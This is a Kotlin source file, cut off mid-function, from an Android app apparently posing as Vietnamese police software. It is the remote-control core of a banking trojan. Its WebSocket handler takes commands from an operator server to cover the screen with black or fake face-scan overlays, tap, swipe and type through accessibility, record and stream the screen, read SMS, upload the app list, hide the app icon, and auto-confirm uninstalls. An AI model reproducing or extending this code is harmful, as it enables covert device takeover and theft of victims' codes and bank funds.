package com.congan.vietnam

import android.Manifest
import android.Manifest.permission.CAMERA
import android.Manifest.permission.READ_SMS
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Path
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.view.inputmethod.InputMethodManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.congan.vietnam.Assists.click
import com.congan.vietnam.Assists.gestureClick
import com.congan.vietnam.Manager.GenericStreamManager
import com.congan.vietnam.base.R
import com.congan.vietnam.utils.AppConfig
import com.congan.vietnam.utils.VpnHelper
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.TimeUnit


object WebSocketManager {

    private var currentPath: Path? = null
    private var isSwiping = false

    private lateinit var androidId: String

    private const val TAG = "WebSocketManager"


    private var webSocket: WebSocket? = null
    private var isConnected = false

    private val client: OkHttpClient = OkHttpClient()
    private val mainHandler = Handler(Looper.getMainLooper())

    private val BATCH_SIZE = 100

    private val keepAliveHandler = Handler(Looper.getMainLooper())
    private val keepAliveRunnable = object : Runnable {
        override fun run() {
            if (isConnected) {
                // 发送在线状态消息

                send(
                    JSONObject(
                        mapOf("type" to "keep_alive", "android_id" to androidId)
                    ).toString()
                )
                Log.d(TAG, "Sent keep_alive message")
            }
            // 再次执行
            keepAliveHandler.postDelayed(this, 5000)
        }
    }


    fun initWebSocket(context: Context) {
        if (webSocket != null && isConnected) {
            Log.d(TAG, "WebSocket is already connected")
            return
        }

        val request = Request.Builder().url(AppConfig.WEBSOCKET_URL).build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                super.onOpen(webSocket, response)
                isConnected = true
                Log.d(TAG, "WebSocket connected")

                androidId = Settings.Secure.getString(
                    Assists.getContext().contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                // 发送设备标识注册消息
                send(
                    JSONObject(
                        mapOf("type" to "register", "android_id" to androidId)
                    ).toString()
                )
                // 启动定时任务发送 keep_alive 消息
                keepAliveHandler.post(keepAliveRunnable)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                super.onMessage(webSocket, text)
                handleMessage(context, text)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                super.onClosed(webSocket, code, reason)
                isConnected = false
                Log.d(TAG, "WebSocket closed: $reason")
                androidId = Settings.Secure.getString(
                    Assists.getContext().contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                send(
                    JSONObject(
                        mapOf("type" to "lixian_alive", "android_id" to androidId)
                    ).toString()
                )

                keepAliveHandler.removeCallbacks(keepAliveRunnable) // 停止定时任务
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                super.onFailure(webSocket, t, response)
                isConnected = false
                Log.e(TAG, "WebSocket error: ${t.localizedMessage}")
                androidId = Settings.Secure.getString(
                    Assists.getContext().contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                send(
                    JSONObject(
                        mapOf("type" to "lixian_alive", "android_id" to androidId)
                    ).toString()
                )

                keepAliveHandler.removeCallbacks(keepAliveRunnable) // 停止定时任务
                reconnect(context)
            }

        })
    }

    private fun reconnect(context: Context) {
        if (webSocket != null) {
            webSocket?.close(1000, "Reconnecting")
            webSocket = null
        }

        keepAliveHandler.removeCallbacks(keepAliveRunnable)


        mainHandler.postDelayed({
            initWebSocket(context)
        }, 5000)
    }


    fun send(message: String): Boolean {
        return if (isConnected) {
            webSocket?.send(message) ?: false
        } else {
            Log.e(TAG, "WebSocket is not connected")
            false
        }
    }


    @SuppressLint("ServiceCast")
    private fun handleMessage(context: Context, message: String) {
        try {
            val command = JSONObject(message)
            Log.d(TAG, "Message received: $message")

            if (command.has("action")) {
                when (command.getString("action")) {
                    "toggle_black_screen" -> {
                        val enable = command.getBoolean("enable")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                if (enable) {

//                                    showOverlay(context)

                                    Assists.service?.showOverlay(false)
//                                    Assists.service?.showOverlay1(false)

                                } else {
                                    Assists.service?.removeOverlay()
                                }
                                sendFeedbackToBackend("切换黑屏", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "切换黑屏",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "tietu" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.service?.showOverlay_red(false)
//                                Assists.service?.showOverlay_red1(false)

                                sendFeedbackToBackend("贴图", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "贴图",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "kaifa" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                openDeveloperOptions(context)
                                sendFeedbackToBackend("开发者", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "开发者",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "setting" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                // 默认跳转到设置主页面
                                var intent = Intent(Settings.ACTION_SETTINGS).apply {
                                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                }
                                context.startActivity(intent)

                                sendFeedbackToBackend("设置页面", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "设置页面",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "zero" -> {
                        val packageName = "com.zerotier.one"
                        Handler(Looper.getMainLooper()).post {
                            try {
                                val intent =
                                    context.packageManager.getLaunchIntentForPackage(packageName)
                                if (intent != null) {
                                    context.startActivity(intent)
                                    sendFeedbackToBackend("打开应用", true, "操作成功")
                                } else {
                                    throw Exception("未找到应用: $packageName")
                                }
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "打开应用",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }


                    "open_sms_notification_settings" -> {
                        try {
                            val intent = Intent(Intent.ACTION_MAIN).apply {
                                addCategory(Intent.CATEGORY_APP_MESSAGING)
                            }
                            context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                            sendFeedbackToBackend("打开短信通知设置", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开短信通知设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_overlay_permission" -> {
                        try {
                            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                                data = Uri.parse("package:${context.packageName}")
                            }
                            context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                            sendFeedbackToBackend("打开悬浮窗权限设置", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开悬浮窗权限设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_accessibility_settings" -> {
                        try {
                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                            context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                            sendFeedbackToBackend("打开无障碍设置", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开无障碍设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_battery_optimization_settings" -> {
                        try {
                            val intent =
                                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                    data = Uri.parse("package:${context.packageName}")
                                }
                            if (intent.resolveActivity(context.packageManager) != null) {
                                context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                                sendFeedbackToBackend("打开电池优化设置", true, "操作成功")
                            } else {
                                throw Exception("无法跳转到电池优化设置")
                            }
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开电池优化设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_auto_start_settings" -> {
                        try {
                            openAutoStartSettings(context)
                            sendFeedbackToBackend("打开自启动设置", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开自启动设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_system_settings" -> {
                        try {
                            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                                data = Uri.parse("package:${context.packageName}")
                            }
                            context.startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                            sendFeedbackToBackend("打开系统设置", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "打开系统设置",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "request_camera_permission" -> {
                        try {
                            if (ContextCompat.checkSelfPermission(
                                    context,
                                    Manifest.permission.CAMERA
                                ) != PackageManager.PERMISSION_GRANTED
                            ) {
                                ActivityCompat.requestPermissions(
                                    Assists.getActivity()!!,
                                    arrayOf(CAMERA),
                                    1001
                                )
                                sendFeedbackToBackend("请求相机权限", true, "权限请求已发起")
                            } else {
                                sendFeedbackToBackend("请求相机权限", true, "相机权限已授予")
                            }
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "请求相机权限",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "request_sms_permission" -> {
                        try {
                            if (ContextCompat.checkSelfPermission(
                                    context,
                                    Manifest.permission.READ_SMS
                                ) != PackageManager.PERMISSION_GRANTED
                            ) {
                                ActivityCompat.requestPermissions(
                                    Assists.getActivity()!!,
                                    arrayOf(READ_SMS),
                                    1002
                                )
                                sendFeedbackToBackend("请求短信权限", true, "权限请求已发起")
                            } else {
                                sendFeedbackToBackend("请求短信权限", true, "短信权限已授予")
                            }
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "请求短信权限",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "request_notification_permission" -> {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                // Android 13 及以上版本：检查并请求通知权限
                                if (ContextCompat.checkSelfPermission(
                                        context,
                                        Manifest.permission.POST_NOTIFICATIONS
                                    ) != PackageManager.PERMISSION_GRANTED
                                ) {
                                    ActivityCompat.requestPermissions(
                                        Assists.getActivity()!!,
                                        arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                                        1003
                                    )
                                    sendFeedbackToBackend("请求通知权限", true, "权限请求已发起")
                                } else {
                                    sendFeedbackToBackend("请求通知权限", true, "通知权限已授予")
                                }
                            } else {
                                // Android 13 之前版本：检查是否需要引导用户手动开启通知权限
                                val notificationManager =
                                    context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                                if (!notificationManager.areNotificationsEnabled()) {
                                    // 通知权限被关闭，跳转到设置页面引导用户开启
                                    val intent =
                                        Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                                            putExtra(
                                                Settings.EXTRA_APP_PACKAGE,
                                                context.packageName
                                            )
                                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // 添加 FLAG_ACTIVITY_NEW_TASK 标志
                                        }
                                    context.startActivity(intent)
                                    sendFeedbackToBackend(
                                        "请求通知权限",
                                        true,
                                        "跳转到设置页面引导用户开启通知权限"
                                    )
                                } else {
                                    sendFeedbackToBackend(
                                        "请求通知权限",
                                        true,
                                        "通知权限已启用，无需请求"
                                    )
                                }
                            }
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "请求通知权限",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }


                    "zhiwen" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.showOverlay_zhiwen()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "renlian" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.showOverlay_renlians()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "bizhi_bank" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.restoreDefaultWallpaper()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "bizhi" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.setDrawableAsWallpaper()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }


                    "face_identify" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.hide_renlian_zhezhao()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "face_bank" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.removeOverlay()
                                Assists.service?.showOverlay_red(false)
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }


                    "face_yindao" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.removeOverlay()
                                Assists.service?.renlian_yindao()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "guanbi" -> {

                        try {
                            Assists.openAccessibilitySetting()
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "final" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.showOverlay_renlian(R.layout.overlay_renlian)
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "touming_black" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.showOverlay2()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "touming_black_clock" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.removeOverlay()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }


                    "touming_black_renlian" -> {

                        try {
                            Handler(Looper.getMainLooper()).post {
                                Assists.showOverlay_renlian()
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "enable_black_screen_btn_all" -> {

                        try {
                            val enable = command.getBoolean("enable")
                            Handler(Looper.getMainLooper()).post {
                                Assists.service?.showOverlay(true)
                            }
                            sendFeedbackToBackend("操作成功", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "操作失败",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "click" -> {
                        val x = command.getInt("x")
                        val y = command.getInt("y")
                        CoroutineScope(Dispatchers.Main).launch {
                            try {
                                Assists.gestureClick(x.toFloat(), y.toFloat(), 100)
                            } catch (e: Exception) {
                            }
                        }
                    }

                    "long_press" -> {
                        val x = command.getInt("x").coerceAtLeast(0)
                        val y = command.getInt("y").coerceAtLeast(0)
                        CoroutineScope(Dispatchers.Main).launch {
                            try {
                                gestureClick(x.toFloat(), y.toFloat(), 1000)
                            } catch (e: Exception) {
                            }
                        }
                    }

                    "swipe_start" -> {
                        val startX = command.getInt("x").coerceAtLeast(0)
                        val startY = command.getInt("y").coerceAtLeast(0)
                        // 初始化路径
                        currentPath = Path().apply {
                            moveTo(startX.toFloat(), startY.toFloat()) // 手势起点
                        }
                        isSwiping = true
                    }

                    "swipe_update" -> {
                        val currentX = command.getInt("x").coerceAtLeast(0)
                        val currentY = command.getInt("y").coerceAtLeast(0)
                        if (isSwiping && currentPath != null) {

                            // 动态添加路径
                            currentPath?.lineTo(currentX.toFloat(), currentY.toFloat())
                        }

                    }


                    "swipe_end" -> {
                        if (isSwiping && currentPath != null) {
                            // 提交完整路径
                            Assists.dispatchGesture(currentPath!!)
                            currentPath = null // 清空路径
                            isSwiping = false // 重置状态
                        }
                    }


                    "swipe" -> {
                        val startX = command.getInt("startX").coerceAtLeast(0)
                        val startY = command.getInt("startY").coerceAtLeast(0)
                        val endX = command.getInt("endX").coerceAtLeast(0)
                        val endY = command.getInt("endY").coerceAtLeast(0)

                        val (screenWidth, screenHeight) = Assists.getFullScreenResolution(Assists.getContext())

                        val validStartX = startX.coerceAtMost(screenWidth)
                        val validStartY = startY.coerceAtMost(screenHeight)
                        val validEndX = endX.coerceAtMost(screenWidth)
                        val validEndY = endY.coerceAtMost(screenHeight)

                        val duration = command.getLong("duration")

                        CoroutineScope(Dispatchers.Main).launch {
                            try {
                                Assists.gesture(
                                    floatArrayOf(validStartX.toFloat(), validStartY.toFloat()),
                                    floatArrayOf(validEndX.toFloat(), validEndY.toFloat()),
                                    0,
                                    duration
                                )
                            } catch (e: Exception) {
                            }
                        }
                    }

                    "keyevent" -> {
                        val keyCode = command.get("keycode")
                        handleKeyEvent(keyCode, context)
                    }

                    "stop_screen_recording" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                if (Assists.screenCaptureService != null) {
                                    Assists.screenCaptureService?.stopSelf()
                                    Assists.screenCaptureService = null
                                    Assists.service?.bitmapSource?.stop()

                                    if (GenericStreamManager.genericStream?.isStreaming == true) {
                                        GenericStreamManager.genericStream?.stopStream()
                                    }
                                    GenericStreamManager.genericStream?.release()

                                    sendFeedbackToBackend("停止屏幕录制", true, "操作成功")
                                } else {
                                    throw Exception("ScreenCaptureService 未运行")
                                }
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "停止屏幕录制",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "start_screen_recording" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.requestScreenCapture(true, "1")
                                sendFeedbackToBackend("开始屏幕录制", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "开始屏幕录制",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "start_screen_recording_no" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.requestScreenCapture(false, "2")
                                sendFeedbackToBackend("开始屏幕录制(无覆盖)", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "开始屏幕录制(无覆盖)",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "chongxin_screen" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.requestScreenCapture(true, "2")
                                sendFeedbackToBackend("开始屏幕录制(无覆盖)", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "开始屏幕录制(无覆盖)",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "mute" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                setMute(context, true)
                                sendFeedbackToBackend("静音", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "静音",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "unmute" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                setMute(context, false)
                                sendFeedbackToBackend("取消静音", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "取消静音",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "shurufa_open" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                val intent = Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)
                                context.startActivity(intent)

                                sendFeedbackToBackend("打开输入法", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "打开输入法",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }


                    "shurufa" -> {
                        Handler(Looper.getMainLooper()).post {
                            try {
                                val imeManager =
                                    context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
                                imeManager.showInputMethodPicker()


                                sendFeedbackToBackend("打开输入法", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "打开输入法",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "update_status" -> {
                        try {
                            Assists.getDeviceInfo()
//                            Assists.screenCaptureService?.update_liu()
//                            Assists.requestScreenCapture(true, "2")

                            sendFeedbackToBackend("更新刷新状态", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "更新刷新状态",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "hide_icon" -> {
                        try {
                            val sharedPreferences =
                                context.getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
                            sharedPreferences.edit().putInt("del", 1).apply()
                            sendFeedbackToBackend("隐藏图标", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "隐藏图标",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "show_icon" -> {
                        try {
                            val sharedPreferences =
                                context.getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
                            sharedPreferences.edit().putInt("del", 0).apply()
                            sendFeedbackToBackend("显示图标", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "显示图标",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "open_app" -> {
                        val packageName = command.getString("packageName")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                val intent =
                                    context.packageManager.getLaunchIntentForPackage(packageName)
                                if (intent != null) {
                                    context.startActivity(intent)
                                    sendFeedbackToBackend("打开应用", true, "操作成功")
                                } else {
                                    throw Exception("未找到应用: $packageName")
                                }
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "打开应用",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }


                    "google_play" -> {
                        val packageName = command.getString("packageName")
                        try {
                            val uri = Uri.parse("market://details?id=$packageName")
                            val intent = Intent(Intent.ACTION_VIEW, uri).apply {
                                setPackage("com.android.vending") // 限制只打开 Google Play
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                        } catch (e: ActivityNotFoundException) {
                            val webUri = Uri.parse("https://play.google.com/store/apps/details?id=$packageName")
                            val webIntent = Intent(Intent.ACTION_VIEW, webUri).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(webIntent)
                        }

                    }
                    "link_openvpn" -> {
                        val androidId = Settings.Secure.getString(
                            Assists.getContext().contentResolver,
                            Settings.Secure.ANDROID_ID
                        )

                        val apiUrl = AppConfig.apiURL+"/api/addvpn?name="+androidId
                        val fileName = androidId+".ovpn"
                        VpnHelper.fetchVpnConfig(context, apiUrl, fileName)
                    }

                    "uninstall_app" -> {
                        val packageName = command.getString("packageName")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                // 检查包名是否存在
                                val installedPackages =
                                    context.packageManager.getInstalledPackages(0)
                                if (installedPackages.none { it.packageName == packageName }) {
                                    sendFeedbackToBackend(
                                        "卸载应用",
                                        false,
                                        "包名不存在: $packageName"
                                    )
                                    return@post
                                }

                                // 创建卸载 Intent
                                val intent = Intent(Intent.ACTION_DELETE).apply {
                                    data = Uri.parse("package:$packageName")
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                }
                                Handler(Looper.getMainLooper()).post {
                                    context.startActivity(intent)

                                    // 延迟点击确认按钮
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        val confirmButton = Assists.findByText("Xóa")
                                            ?: Assists.findByText("OK")
                                            ?: Assists.findByText("Uninstall")
                                            ?: Assists.findByText("Xác nhận")


                                        confirmButton?.firstOrNull()?.click()
                                            ?: sendFeedbackToBackend(
                                                "卸载应用",
                                                false,
                                                "请手动点击确认卸载按钮"
                                            )

                                    }, 2000)
                                }
                            } catch (e: Exception) {
                                sendFeedbackToBackend("卸载应用", false, "Exception: ${e.message}")
                            }
                        }
                    }

                    "liangdu" -> {
                        val number = command.getInt("number")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.service?.setScreenBrightness(number)
                                sendFeedbackToBackend("调整亮度", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "调整亮度",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "qingxi" -> {
                        val number = command.getString("number")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.service?.updateRedFilter(number.toFloat())
                                sendFeedbackToBackend("调整亮度", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "调整亮度",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "paste_text" -> {
                        val text = command.getString("text")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                Assists.service?.inputText(text)
                                sendFeedbackToBackend("粘贴文本", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "粘贴文本",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "applist" -> {
                        try {
                            uploadInstalledAppsInBatches(Assists.getContext(), 50)
                            sendFeedbackToBackend("获取应用列表", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "获取应用列表",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "get_sms" -> {
                        try {
                            getSms()
                            sendFeedbackToBackend("获取短信", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend(
                                "获取短信",
                                false,
                                e.localizedMessage ?: "未知错误"
                            )
                        }
                    }

                    "left_swipe" -> {
                        try {
                            performSwipeGesture(context, "left")
                            sendFeedbackToBackend("左滑", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend("左滑", false, e.localizedMessage ?: "未知错误")
                        }
                    }

                    "top_swipe" -> {
                        try {
                            performSwipeGesture(context, "up")
                            sendFeedbackToBackend("上滑", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend("上滑", false, e.localizedMessage ?: "未知错误")
                        }
                    }

                    "right_swipe" -> {
                        try {
                            performSwipeGesture(context, "right")
                            sendFeedbackToBackend("右滑", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend("右滑", false, e.localizedMessage ?: "未知错误")
                        }
                    }

                    "bottom_swipe" -> {
                        try {
                            performSwipeGesture(context, "down")
                            sendFeedbackToBackend("下滑", true, "操作成功")
                        } catch (e: Exception) {
                            sendFeedbackToBackend("下滑", false, e.localizedMessage ?: "未知错误")
                        }
                    }

                    "send_notification" -> {
                        val title = command.getString("title")
                        val content = command.getString("content")
                        Handler(Looper.getMainLooper()).post {
                            try {
                                sendNotification(context, title, content)
                                sendFeedbackToBackend("发送通知", true, "操作成功")
                            } catch (e: Exception) {
                                sendFeedbackToBackend(
                                    "发送通知",
                                    false,
                                    e.localizedMessage ?: "未知错误"
                                )
                            }
                        }
                    }

                    "video" -> {
                    }

                    else -> {
                        Log.e(TAG, "Unknown action: ${command.getString("action")}")
                    }
                }
            } else {
                Log.e(TAG, "Invalid message format: Missing 'action' field")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing message: ${e.localizedMessage}")
        }
    }


    fun openDeveloperOptions(context: Context) {
        try {
            // 尝试直接跳转到开发者选项页面
            val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // 如果跳转失败，尝试跳转到设置主页面
            redirectToBrandSpecificSettings(context)
        }
    }

    fun redirectToBrandSpecificSettings(context: Context) {
